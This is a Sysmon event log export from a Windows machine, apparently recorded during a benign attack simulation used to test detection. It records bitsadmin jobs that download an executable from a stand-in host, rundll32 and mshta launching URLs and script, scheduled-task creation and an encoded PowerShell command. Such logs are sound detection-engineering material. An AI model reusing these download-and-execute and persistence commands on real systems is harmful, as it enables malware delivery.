"11/27/2025 11:33:41 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:41.540
ProcessGuid: {3a35410f-927d-6928-c810-000000000b00}
ProcessId: 10836
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: WMI Commandline Utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" os get Caption 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:41 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:41.496
ProcessGuid: {3a35410f-927d-6928-c710-000000000b00}
ProcessId: 13208
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data\Crashpad"" ""--metrics-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" --url=https://cr.brave.com --annotation=plat=Win64 --annotation=prod=Brave --annotation=ver=142.1.84.141 --initial-client-data=0x124,0x128,0x12c,0x120,0x130,0x7ffd9b025a28,0x7ffd9b025a34,0x7ffd9b025a40
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-927d-6928-c610-000000000b00}
ParentProcessId: 11048
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --disable-domain-reliability --enable-dom-distiller --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --lso-url=https://no-thanks.invalid --variations-server-url=https://variations.brave.com/seed --variations-insecure-server-url=https://variations.brave.com/seed --flag-switches-begin --flag-switches-end --component-updater=url-source=https://go-updater.brave.com/extensions --do-not-de-elevate --single-argument http://malicious.test/1
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:41 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:41.446
ProcessGuid: {3a35410f-927d-6928-c610-000000000b00}
ProcessId: 11048
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --disable-domain-reliability --enable-dom-distiller --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --lso-url=https://no-thanks.invalid --variations-server-url=https://variations.brave.com/seed --variations-insecure-server-url=https://variations.brave.com/seed --flag-switches-begin --flag-switches-end --component-updater=url-source=https://go-updater.brave.com/extensions --do-not-de-elevate --single-argument http://malicious.test/1
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-927c-6928-b410-000000000b00}
ParentProcessId: 14624
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/1
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:41 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:41.362
ProcessGuid: {3a35410f-927d-6928-c410-000000000b00}
ProcessId: 6236
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /complete job2 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:41 PM","11","Information","File created:
RuleName: T1053
UtcTime: 2025-11-27 18:03:41.348
ProcessGuid: {3a35410f-6568-6928-2400-000000000b00}
ProcessId: 1532
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\FakeTask2
CreationUtcTime: 2025-11-27 18:03:41.348
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:41 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:41.317
ProcessGuid: {3a35410f-927d-6928-c210-000000000b00}
ProcessId: 11596
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /resume job2 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:41 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:41.277
ProcessGuid: {3a35410f-927d-6928-c110-000000000b00}
ProcessId: 10548
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s seclogon
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {3a35410f-6567-6928-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=3D1034D6ED3DAED60816A25C561E8C83,SHA256=B0B36BFF7AE4057F687D839CD4B3D81159AB646F1EE1B22106A927E93DECBB61,IMPHASH=F9BBD96FAE53B7A31264A703CAFA0666
ParentProcessGuid: {3a35410f-6567-6928-0b00-000000000b00}
ParentProcessId: 708
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:41 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:41.246
ProcessGuid: {3a35410f-927d-6928-bf10-000000000b00}
ProcessId: 10520
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /addfile job2 http://example.com/file.exe C:\Temp\file2.exe 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:41 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:41.202
ProcessGuid: {3a35410f-927d-6928-bd10-000000000b00}
ProcessId: 10808
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /create job2 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:41 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:41.152
ProcessGuid: {3a35410f-927d-6928-ba10-000000000b00}
ProcessId: 5408
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /delete /tn FakeTask2 /f 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:41 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:41.106
ProcessGuid: {3a35410f-927d-6928-b910-000000000b00}
ProcessId: 10740
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /create /tn FakeTask2 /tr notepad.exe /sc once /st 23:59 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:41 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:41.060
ProcessGuid: {3a35410f-927d-6928-b810-000000000b00}
ProcessId: 5500
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/2 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:40 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:03:40.697
ProcessGuid: {3a35410f-927c-6928-af10-000000000b00}
ProcessId: 2552
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_dzfmwnxj.fzf.ps1
CreationUtcTime: 2025-11-27 18:03:40.697
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:40 PM","8","Information","CreateRemoteThread detected:
RuleName: -
UtcTime: 2025-11-27 18:03:40.692
SourceProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
SourceProcessId: 4396
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {3a35410f-927c-6928-b710-000000000b00}
TargetProcessId: 9136
TargetImage: <unknown process>
NewThreadId: 2212
StartAddress: 0x00007FF6970C30D0
StartModule: -
StartFunction: -
SourceUser: DESKTOP-EJG8QJC\Emil Jinu
TargetUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:40 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:40.656
ProcessGuid: {3a35410f-927c-6928-b610-000000000b00}
ProcessId: 1932
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data\Crashpad"" ""--metrics-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" --url=https://cr.brave.com --annotation=plat=Win64 --annotation=prod=Brave --annotation=ver=142.1.84.141 --initial-client-data=0x120,0x124,0x128,0xfc,0x12c,0x7ffd9b025a28,0x7ffd9b025a34,0x7ffd9b025a40
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-927c-6928-b410-000000000b00}
ParentProcessId: 14624
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/1
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:40 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:40.642
ProcessGuid: {3a35410f-927c-6928-b510-000000000b00}
ProcessId: 10860
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.19041.5794 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: ""C:\Windows\system32\mshta.exe"" javascript:alert('test2') 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=B8ED3F707000C22AEE6BBF961879EA99,SHA256=F8A2FD36FDC35AA8E7E678576A2ECC5D7B3FE6383E73101508E5D7B49443D153,IMPHASH=482D661ACB78B36340AF7BEB797951EE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:40 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:40.502
ProcessGuid: {3a35410f-927c-6928-b410-000000000b00}
ProcessId: 14624
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/1
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-927b-6928-a110-000000000b00}
ParentProcessId: 9244
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/1 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:40 PM","13","Information","Registry value set:
RuleName: InvDB-Ver
EventType: SetValue
UtcTime: 2025-11-27 18:03:40.386
ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00}
ProcessId: 2740
Image: C:\Windows\System32\svchost.exe
TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\bitsadmin.exe|62b1e2e365ba4149\BinProductVersion
Details: 7.8.19041.1
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:40 PM","13","Information","Registry value set:
RuleName: InvDB-CompileTimeClaim
EventType: SetValue
UtcTime: 2025-11-27 18:03:40.386
ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00}
ProcessId: 2740
Image: C:\Windows\System32\svchost.exe
TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\bitsadmin.exe|62b1e2e365ba4149\LinkDate
Details: 11/17/2089 23:44:10
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:40 PM","13","Information","Registry value set:
RuleName: InvDB-Pub
EventType: SetValue
UtcTime: 2025-11-27 18:03:40.386
ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00}
ProcessId: 2740
Image: C:\Windows\System32\svchost.exe
TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\bitsadmin.exe|62b1e2e365ba4149\Publisher
Details: microsoft corporation
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:40 PM","13","Information","Registry value set:
RuleName: InvDB-Path
EventType: SetValue
UtcTime: 2025-11-27 18:03:40.386
ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00}
ProcessId: 2740
Image: C:\Windows\System32\svchost.exe
TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\bitsadmin.exe|62b1e2e365ba4149\LowerCaseLongPath
Details: c:\windows\system32\bitsadmin.exe
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:40 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:40.234
ProcessGuid: {3a35410f-927c-6928-af10-000000000b00}
ProcessId: 2552
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAdQBzAHAAaQBjAGkAbwB1AHMAXwBlAHYAZQBuAHQAXwAxACcA 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:40 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:40.215
ProcessGuid: {3a35410f-927c-6928-ae10-000000000b00}
ProcessId: 5236
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: WMI Commandline Utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" os get Caption 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:40 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:40.167
ProcessGuid: {3a35410f-927c-6928-ac10-000000000b00}
ProcessId: 12376
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /complete job1 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:40 PM","11","Information","File created:
RuleName: T1053
UtcTime: 2025-11-27 18:03:40.146
ProcessGuid: {3a35410f-6568-6928-2400-000000000b00}
ProcessId: 1532
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\FakeTask1
CreationUtcTime: 2025-11-27 18:03:40.146
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:40 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:40.112
ProcessGuid: {3a35410f-927c-6928-aa10-000000000b00}
ProcessId: 14164
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /resume job1 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:40 PM","13","Information","Registry value set:
RuleName: InvDB-Ver
EventType: SetValue
UtcTime: 2025-11-27 18:03:40.111
ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00}
ProcessId: 2740
Image: C:\Windows\System32\svchost.exe
TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\regsvr32.exe|20eb212352f3412a\BinProductVersion
Details: 10.0.19041.1
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:40 PM","13","Information","Registry value set:
RuleName: InvDB-CompileTimeClaim
EventType: SetValue
UtcTime: 2025-11-27 18:03:40.111
ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00}
ProcessId: 2740
